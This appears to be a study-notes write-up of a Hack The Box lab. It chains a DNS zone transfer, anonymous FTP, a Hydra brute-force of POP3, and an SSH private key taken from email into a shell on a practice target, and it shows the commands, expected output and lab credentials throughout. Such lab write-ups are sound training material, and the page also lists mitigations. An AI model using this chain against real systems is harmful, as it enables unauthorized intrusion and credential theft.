---
tags: [lab, attack/network, enumeration/dns, enumeration/ftp, enumeration/smtp]
module: attacking_common_services
last_updated: 2026-05-12
source_count: 1
---

# HTB Lab — Attacking Common Services: Medium Skill Assessment

**Difficulty:** Medium
**Target IP:** STMIP (your spawned machine IP)
**OS:** Linux (Ubuntu 20.04)

Single-question engagement. The attack chain crosses five different services — DNS, FTP, POP3, email, and SSH — with each step providing the credential or information needed to access the next. No service is brute-forced with a large wordlist; every password is either found in a file or obtained from a targeted list left behind by the target user.

```
DNS zone transfer
  → internal FTP vHost on non-standard port
    → anonymous FTP → password list
      → POP3 brute-force → email with SSH private key
        → SSH shell → flag
```

---

## Question 1

> Assess the target server and find the flag.txt file. Submit the contents of this file as your answer.

---

## Phase 1 — Service Discovery

### Step 1 — Initial nmap scan

```bash
nmap -A STMIP
```

The scan will show DNS running on port 53 (ISC BIND 9.16.1), along with other services. DNS is the most important finding from this initial scan — a misconfigured nameserver is typically the entry point for internal network mapping.

```
53/tcp  open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
```

---

## Phase 2 — DNS Zone Transfer

### Step 2 — Attempt AXFR against the domain

Whenever you find a DNS server on an engagement, immediately attempt a zone transfer. A permissive nameserver hands you the entire internal DNS record set — hostnames, IPs, and service names that are not visible from the outside.

```bash
dig AXFR inlanefreight.htb @STMIP
```

Expected output:

```
inlanefreight.htb.         604800 IN SOA  inlanefreight.htb. root.inlanefreight.htb. ...
inlanefreight.htb.         604800 IN NS   ns.inlanefreight.htb.
app.inlanefreight.htb.     604800 IN A    10.129.200.5
dc1.inlanefreight.htb.     604800 IN A    10.129.100.10
dc2.inlanefreight.htb.     604800 IN A    10.129.200.10
int-ftp.inlanefreight.htb. 604800 IN A    127.0.0.1
int-nfs.inlanefreight.htb. 604800 IN A    10.129.200.70
ns.inlanefreight.htb.      604800 IN A    127.0.0.1
un.inlanefreight.htb.      604800 IN A    10.129.200.142
ws1.inlanefreight.htb.     604800 IN A    10.129.200.101
ws2.inlanefreight.htb.     604800 IN A    10.129.200.102
wsus.inlanefreight.htb.    604800 IN A    10.129.200.80
```

Two records resolve to `127.0.0.1`: `ns.inlanefreight.htb` (the nameserver itself) and `int-ftp.inlanefreight.htb`. The `127.0.0.1` address means the FTP service is running locally on the same machine as the DNS server — it is bound to localhost or a vHost rather than the external IP. It is described internally as an "internal FTP" service, suggesting it was not intended to be reachable from outside.

The zone transfer has just given you a complete internal network map. Every other IP in the list is a different internal host (domain controllers, workstations, WSUS). For this engagement, `int-ftp.inlanefreight.htb` is the pivot point.

See [[definitions/dns]] for a full explanation of zone transfers and how to detect whether AXFR is restricted.

---

## Phase 3 — vHost Registration and FTP Discovery

### Step 3 — Add the internal FTP host to /etc/hosts

Unlike the SMTP enumeration earlier (where `-D inlanefreight.htb` was just a string), here you need the hostname to actually resolve — the FTP client and nmap will both try to look it up through the OS. Adding it to `/etc/hosts` maps the name to the target IP, bypassing the fact that `.htb` domains don't exist in public DNS:

```bash
sudo sh -c 'echo "STMIP int-ftp.inlanefreight.htb" >> /etc/hosts'
```

Replace `STMIP` with the actual target IP. Verify it works:

```bash
ping -c 1 int-ftp.inlanefreight.htb
```

### Step 4 — Full port scan on the internal FTP host

The initial nmap scan covered common ports. Because the FTP service is "internal" and likely misconfigured, it may be running on a non-standard port that a default scan would miss. Run a full scan:

```bash
nmap -p- -T4 -A int-ftp.inlanefreight.htb
```

| Flag | What it does |
|------|-------------|
| `-p-` | Scan all 65,535 TCP ports (default scans only the top 1,000) |
| `-T4` | Aggressive timing — speeds up the scan; use only when network conditions allow |
| `-A` | Service version detection, OS detection, and script scanning |

Port 30021 appears:

```
30021/tcp open  unknown
| fingerprint-strings:
|   GenericLines:
|     220 ProFTPD Server (Internal FTP) [10.129.183.208]
```

The banner confirms this is **ProFTPD** on a non-standard port (the default FTP port is 21). The label "Internal FTP" matches what the DNS record name suggested.

---

## Phase 4 — Anonymous FTP and Password Discovery

### Step 5 — Attempt anonymous login

Before attempting any brute-force, always try the most common default: anonymous FTP login. Many internal FTP servers used for file sharing allow this:

```bash
ftp int-ftp.inlanefreight.htb 30021
```

At the username prompt, enter `anonymous`. For the password, anything works (or your email address, as the banner requests):

```
Name: anonymous
Password: anything@test.com

230 Anonymous access granted, restrictions apply
```

A `230` response confirms anonymous access is allowed.

### Step 6 — Enumerate and download files

```
ftp> ls
```

```
drwxr-xr-x   2 ftp   ftp   4096 Apr 18  2022 simon
```

There is one directory named `simon` — a username. Change into it and retrieve everything:

```
ftp> cd simon
ftp> ls
ftp> get mynotes.txt
ftp> bye
```

### Step 7 — Read mynotes.txt

```bash
cat mynotes.txt
```

The file contains a short list of strings that look like passwords — not text notes. This is a targeted wordlist: someone named `simon` left a personal notes file on the server that doubles as a password cheat sheet. The username `simon` and this wordlist are the inputs for the next step.

---

## Phase 5 — POP3 Brute-Force

### Step 8 — Why POP3?

The initial nmap scan revealed a POP3 service on port 110 (check your scan output — standard ports). POP3 is a mail retrieval protocol. With a confirmed username (`simon`, from the FTP directory name) and a small targeted wordlist (`mynotes.txt`), brute-forcing POP3 is the natural next step. The wordlist is small enough (8 entries) that this will be nearly instant.

```bash
hydra -l simon -P mynotes.txt pop3://STMIP
```

| Flag | What it does |
|------|-------------|
| `-l simon` | Single username — found from the FTP directory listing |
| `-P mynotes.txt` | The password list recovered from the FTP server |
| `pop3://STMIP` | POP3 on port 110 |

Expected output:

```
[110][pop3] host: 10.129.x.x   login: simon   password: 8Ns8j1b!23hs4921smHzwn
1 of 1 target successfully completed, 1 valid password found
```

Credentials: **simon / 8Ns8j1b!23hs4921smHzwn**

---

## Phase 6 — POP3 Mail Access

### Step 9 — Read simon's email

Connect to POP3 directly using netcat. POP3 is a plain-text, line-based protocol — you can speak it manually:

```bash
nc -nv STMIP 110
```

```
+OK Dovecot (Ubuntu) ready.
```

Authenticate and retrieve the inbox:

```
user simon
+OK
pass 8Ns8j1b!23hs4921smHzwn
+OK Logged in.
list
+OK 1 messages:
1 1630
.
retr 1
```

#### POP3 command reference

| Command | What it does |
|---------|-------------|
| `user <name>` | Send the username |
| `pass <password>` | Send the password — `+OK Logged in.` confirms success |
| `list` | List all messages: `<index> <size-in-bytes>` |
| `retr <n>` | Retrieve full message n (headers + body) |
| `dele <n>` | Mark message n for deletion on logout |
| `quit` | Close the session (deletions are applied on quit) |

The `retr 1` output is an email from `admin@inlanefreight.htb` to `simon@inlanefreight.htb` with subject "New Access". The body contains an SSH private key.

---

## Phase 7 — SSH Key Extraction

### Step 10 — Reconstruct the private key

The SSH private key arrives in the raw email body with spaces where line breaks should be. PEM format (which OpenSSH private keys use) requires specific line lengths — a key with spaces instead of newlines will be rejected by ssh.

The raw key as it appears in the email:

```
-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEA... -----END OPENSSH PRIVATE KEY-----
```

Convert it to proper format by replacing every space with a newline, then redirect to a file:

```bash
echo 'PASTE-FULL-KEY-STRING-HERE' | sed 's/ /\n/g' > id_rsa
```

#### Why `sed 's/ /\n/g'` works

The key data itself has no spaces in it — only the structural spaces between what should be separate lines. Replacing every space with a newline reconstructs the correct line-by-line PEM structure. The result must look like:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S4
...
-----END OPENSSH PRIVATE KEY-----
```

The header `-----BEGIN OPENSSH PRIVATE KEY-----` and footer `-----END OPENSSH PRIVATE KEY-----` must each be on their own line with nothing else on that line.

**Alternative:** Copy only the base64 block (between the header and footer lines) and paste it into an online PEM formatter, then add the header and footer lines manually.

### Step 11 — Set key permissions

SSH refuses to use a private key file that is readable by anyone other than the owner:

```bash
chmod 600 id_rsa
```

If you skip this step, ssh exits with:

```
WARNING: UNPROTECTED PRIVATE KEY FILE!
Permissions 0644 for 'id_rsa' are too open.
```

### Step 12 — SSH in and read the flag

```bash
ssh -i id_rsa simon@STMIP
```

Accept the host key fingerprint on first connection (`yes`). Once logged in:

```bash
cat flag.txt
```

---

## Why the Chain Works

Each service failure feeds the next attack:

| Misconfiguration | Consequence |
|-----------------|-------------|
| DNS zone transfer unrestricted | Complete internal hostname map, including `int-ftp` |
| FTP on non-standard port 30021 | Hidden from default nmap scans; full `-p-` scan required |
| Anonymous FTP login enabled | No credentials needed to access the server at all |
| Password list left in user directory | Turns a guessing problem into a lookup |
| POP3 reachable externally | Mail access from outside the network |
| SSH private key sent via plaintext email | Key material exposed to anyone who reads the mailbox |

Any one of these mitigations would break the chain: restrict AXFR, disable anonymous FTP, remove the notes file, block external POP3 access, or use end-to-end encrypted key delivery.

---

## Lessons Learned

- **Zone transfers before anything else** — DNS is a free infrastructure map. As soon as you see port 53, run `dig AXFR` before touching any other service. Internal hostnames like `int-ftp` point you at services that don't appear in a standard external scan.
- **Always scan all ports on interesting vHosts** — the initial scan of the main IP won't show services on non-standard ports that are tied to a specific vHost. Add the vHost to `/etc/hosts`, then run `-p-` against it.
- **Anonymous FTP is the first thing to try** — before attempting any brute-force on FTP, try `anonymous` as the username. It is still commonly enabled on internal servers that were set up for file sharing.
- **Files on FTP servers are intelligence** — a file called `mynotes.txt` in a directory named after a user is almost certainly personal data. Always download and read every file found during FTP enumeration.
- **Small, targeted wordlists beat large ones** — the password list found on FTP was 8 entries, tailored specifically to simon. Hydra finished in seconds. A 14-million-entry wordlist on a rate-limited service would have taken hours.
- **PEM key formatting is strict** — an SSH private key extracted from raw email output will have formatting issues. The `sed 's/ /\n/g'` trick reconstructs the correct line breaks. Always verify the header and footer are on their own lines before attempting to use the key.

## Related pages

- [[definitions/dns]] — DNS zones, AXFR, detecting unrestricted transfers
- [[attack/dns]] — exploiting zone transfers, subdomain takeover
- [[enumeration/ftp]] — FTP enumeration, anonymous login, banner grabbing
- [[attack/ftp]] — FTP brute-force, CVE-2022-22836
- [[enumeration/imap_pop3]] — POP3 command reference, TLS access, curl alternative
- [[tools/enumeration/dig]] — AXFR syntax and dig command reference
- [[tools/attack/hydra]] — brute-force syntax for POP3 and other protocols
- [[tools/utility/ssh]] — SSH key management, known_hosts cleanup

## Sources

- raw/lab/attacking_common_services/lab_medium_skill_assessment.md
